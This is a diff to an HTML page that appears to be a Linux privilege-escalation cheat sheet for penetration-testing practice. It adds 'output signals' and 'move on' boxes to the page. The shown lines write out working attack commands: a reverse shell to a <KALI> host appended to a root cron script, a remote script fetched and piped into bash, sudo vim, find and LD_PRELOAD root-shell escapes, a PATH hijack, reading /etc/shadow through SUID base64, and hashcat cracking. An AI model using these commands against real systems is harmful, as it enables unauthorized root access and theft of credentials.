@@ -94,6 +94,18 @@
     /* FOOTER */
     footer { text-align: center; padding: 2rem; color: var(--dim); font-size: 0.78rem; border-top: 1px solid var(--border); font-family: var(--mono); margin-top: 2rem; }
 
+    /* SIGNAL BOX — new format */
+    .sig-entry { margin-bottom: 1rem; padding-bottom: 1rem; border-bottom: 1px solid var(--border); }
+    .sig-entry:last-child { margin-bottom: 0; padding-bottom: 0; border-bottom: none; }
+    .sig-signal { color: var(--muted); display: block; margin-bottom: 4px; }
+    .sig-label { color: var(--yellow); }
+    .sig-cmd { color: var(--green); display: block; padding-left: 1em; }
+    .sig-note { color: var(--dim); font-size: 0.73rem; padding-left: 1em; display: block; font-style: italic; }
+    /* MOVE ON BOX */
+    .moveon { background: #f8514908; border: 1px solid #f8514955; border-left: 3px solid var(--red); border-radius: 6px; padding: 10px 13px; margin: 0.75rem 0; font-family: var(--mono); font-size: 0.78rem; line-height: 1.75; }
+    .moveon-title { font-size: 0.65rem; letter-spacing: 0.1em; text-transform: uppercase; color: var(--red); margin-bottom: 7px; display: block; }
+    .moveon-item { color: var(--muted); display: block; padding-left: 0.5em; }
+    .moveon-item::before { content: "✗ "; color: var(--red); }
     /* COPY JS */
   </style>
   <script>
@@ -137,6 +149,39 @@
 wget -q http://&lt;KALI&gt;:8080/linpeas.sh -O /tmp/lpe.sh &amp;&amp; chmod +x /tmp/lpe.sh &amp;&amp; /tmp/lpe.sh | tee /tmp/lpe.txt
 <span class="c"># If no curl/wget — pure bash download:</span>
 exec 3&lt;&gt;/dev/tcp/&lt;KALI&gt;/8080 &amp;&amp; echo -e "GET /linpeas.sh HTTP/1.0\r\n\r\n" &gt;&amp;3 &amp;&amp; cat &lt;&amp;3 | bash</pre></div>
+      <div class="sig">
+        <span class="sig-title">output signals</span>
+        <div class="sig-entry">
+          <span class="sig-signal"><span class="sig-label">Signal:</span> RED/YELLOW — sudo -l shows (ALL) NOPASSWD or specific binary</span>
+          <span class="sig-cmd">sudo -l <span class="sig-note">-- confirm, then check GTFOBins for that binary</span></span>
+          <span class="sig-cmd">sudo /usr/bin/vim -c ':!/bin/bash' <span class="sig-note">-- example: vim GTFOBins escape</span></span>
+        </div>
+        <div class="sig-entry">
+          <span class="sig-signal"><span class="sig-label">Signal:</span> RED — SUID binary found (e.g. /usr/bin/find, /usr/bin/python3)</span>
+          <span class="sig-cmd">find / -perm -4000 -type f 2>/dev/null <span class="sig-note">-- list all SUID binaries</span></span>
+          <span class="sig-cmd">find /tmp -exec bash -p \; <span class="sig-note">-- GTFOBins: find SUID</span></span>
+        </div>
+        <div class="sig-entry">
+          <span class="sig-signal"><span class="sig-label">Signal:</span> RED — writable cron script or cron running as root</span>
+          <span class="sig-cmd">echo 'bash -i >&amp; /dev/tcp/&lt;KALI&gt;/4444 0&gt;&amp;1' >> /opt/scripts/backup.sh <span class="sig-note">-- append rev shell to writable cron script</span></span>
+          <span class="sig-cmd">rlwrap nc -lvnp 4444 <span class="sig-note">-- wait for cron to fire (max 1 min)</span></span>
+        </div>
+        <div class="sig-entry">
+          <span class="sig-signal"><span class="sig-label">Signal:</span> YELLOW — interesting files: .bash_history, config.php, id_rsa</span>
+          <span class="sig-cmd">cat ~/.bash_history <span class="sig-note">-- look for commands with passwords</span></span>
+          <span class="sig-cmd">find / -name "id_rsa" -o -name "id_dsa" 2>/dev/null <span class="sig-note">-- find private keys</span></span>
+          <span class="sig-cmd">grep -r "password" /var/www/html/ 2>/dev/null | grep -v ".js:" <span class="sig-note">-- grep web configs</span></span>
+        </div>
+      </div>
+      <div class="moveon">
+        <span class="moveon-title">move on (to next vector) when</span>
+        <span class="moveon-item">linpeas output fully read top to bottom — not skimmed</span>
+        <span class="moveon-item">sudo -l returns "sorry, user X may not run sudo" — move to SUID</span>
+        <span class="moveon-item">no interesting SUID — move to cron</span>
+        <span class="moveon-item">no writable crons — move to capabilities, then passwd, then kernel</span>
+        <span class="moveon-item">all vectors exhausted and still stuck — run pspy64 to catch background processes</span>
+      </div>
+    </section>
       <div class="cb"><div class="cb-head"><span class="cb-lbl">pspy — watch processes without root</span><button class="cpb" onclick="cp(this)">copy</button></div>
         <pre>wget -q http://&lt;KALI&gt;:8080/pspy64 -O /tmp/pspy &amp;&amp; chmod +x /tmp/pspy &amp;&amp; /tmp/pspy
 <span class="c"># Look for: scripts run as UID=0, writable paths, cron commands you can't see in /etc/crontab</span></pre></div>
@@ -193,6 +238,28 @@ void _init() {
 CEOF
 gcc -fPIC -shared -o /tmp/preload.so /tmp/preload.c -nostartfiles
 sudo LD_PRELOAD=/tmp/preload.so &lt;any_allowed_binary&gt;</pre></div>
+      <div class="sig">
+        <span class="sig-title">output signals</span>
+        <div class="sig-entry">
+          <span class="sig-signal"><span class="sig-label">Signal:</span> sudo -l shows (root) NOPASSWD: /usr/bin/vim</span>
+          <span class="sig-cmd">sudo vim -c ':!/bin/bash' <span class="sig-note">-- instant root shell</span></span>
+        </div>
+        <div class="sig-entry">
+          <span class="sig-signal"><span class="sig-label">Signal:</span> sudo -l shows (root) NOPASSWD: /usr/bin/python3 /opt/script.py</span>
+          <span class="sig-cmd">ls -la /opt/script.py <span class="sig-note">-- check if you can write to the script</span></span>
+          <span class="sig-cmd">echo 'import os; os.system("/bin/bash")' >> /opt/script.py && sudo /usr/bin/python3 /opt/script.py <span class="sig-note">-- if writable, inject shell</span></span>
+        </div>
+        <div class="sig-entry">
+          <span class="sig-signal"><span class="sig-label">Signal:</span> env_keep+=LD_PRELOAD in sudo -l output</span>
+          <span class="sig-cmd">gcc -fPIC -shared -o /tmp/preload.so /tmp/preload.c -nostartfiles && sudo LD_PRELOAD=/tmp/preload.so &lt;allowed_binary&gt; <span class="sig-note">-- preload root shell</span></span>
+        </div>
+      </div>
+      <div class="moveon">
+        <span class="moveon-title">move on when</span>
+        <span class="moveon-item">sudo -l returns: "may not run sudo" — no sudo path, move to SUID</span>
+        <span class="moveon-item">sudo requires password you don't have and no GTFOBins escape applies</span>
+        <span class="moveon-item">sudo binary found but already fully patched (check version vs GTFOBins)</span>
+      </div>
     </section>
 
     <section class="sec" id="suid">
@@ -224,6 +291,30 @@ cp /bin/bash /tmp/r; chmod 4777 /tmp/r; /tmp/r -p
 
 <span class="c"># base64 (read shadow):</span>
 LFILE=/etc/shadow; /usr/bin/base64 "$LFILE" | base64 -d</pre></div>
+      <div class="sig">
+        <span class="sig-title">output signals</span>
+        <div class="sig-entry">
+          <span class="sig-signal"><span class="sig-label">Signal:</span> /usr/bin/find has SUID bit set</span>
+          <span class="sig-cmd">find /tmp -exec bash -p \; <span class="sig-note">-- instant root shell via GTFOBins</span></span>
+        </div>
+        <div class="sig-entry">
+          <span class="sig-signal"><span class="sig-label">Signal:</span> Unknown custom binary has SUID (e.g. /opt/backup)</span>
+          <span class="sig-cmd">strings /opt/backup <span class="sig-note">-- look for relative command calls (e.g. "tar" without full path)</span></span>
+          <span class="sig-cmd">ltrace /opt/backup 2>&1 | head -30 <span class="sig-note">-- trace library calls</span></span>
+          <span class="sig-cmd">echo '/bin/bash -p' > /tmp/tar && chmod +x /tmp/tar && PATH=/tmp:$PATH /opt/backup <span class="sig-note">-- PATH hijack if relative command found</span></span>
+        </div>
+        <div class="sig-entry">
+          <span class="sig-signal"><span class="sig-label">Signal:</span> /usr/bin/base64 has SUID</span>
+          <span class="sig-cmd">LFILE=/etc/shadow; /usr/bin/base64 "$LFILE" | base64 -d <span class="sig-note">-- read shadow, then crack offline</span></span>
+          <span class="sig-cmd">hashcat -m 1800 shadow_hashes.txt /usr/share/wordlists/rockyou.txt <span class="sig-note">-- crack sha512crypt</span></span>
+        </div>
+      </div>
+      <div class="moveon">
+        <span class="moveon-title">move on when</span>
+        <span class="moveon-item">all SUID binaries checked against GTFOBins — none applicable</span>
+        <span class="moveon-item">custom SUID binary fully reversed — no injectable path or writable dependency</span>
+        <span class="moveon-item">move to cron jobs next</span>
+      </div>
     </section>
 
     <section class="sec" id="cron">
